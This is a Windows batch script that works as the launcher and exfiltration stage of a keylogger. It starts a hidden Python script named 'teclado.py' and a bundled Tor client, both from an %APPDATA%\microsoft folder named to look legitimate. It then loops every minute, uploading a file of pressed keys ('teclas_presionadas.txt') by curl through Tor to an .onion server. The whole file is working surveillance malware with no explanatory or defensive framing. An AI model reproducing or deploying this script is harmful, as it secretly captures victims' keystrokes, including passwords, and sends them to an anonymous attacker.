@echo off
cd /d %APPDATA%\microsoft\python
powershell -WindowStyle Hidden -Command "Start-Process '%APPDATA%\microsoft\python\python.exe' -ArgumentList '%APPDATA%\microsoft\python\teclado.py' -NoNewWindow"
powershell -WindowStyle Hidden -Command "Start-Process '%APPDATA%\microsoft\tor\tor\tor.exe' -NoNewWindow"

:loop
    curl --proxy socks5h://127.0.0.1:9050 -X POST -F "file=@%APPDATA%\microsoft\python\teclas_presionadas.txt" http://uib7jtui7mgel2by54xsc33nfz7fuvlfiky3bu3umfdaw2vmqo3kbrad.onion/upload
    timeout /t 60
 goto loop
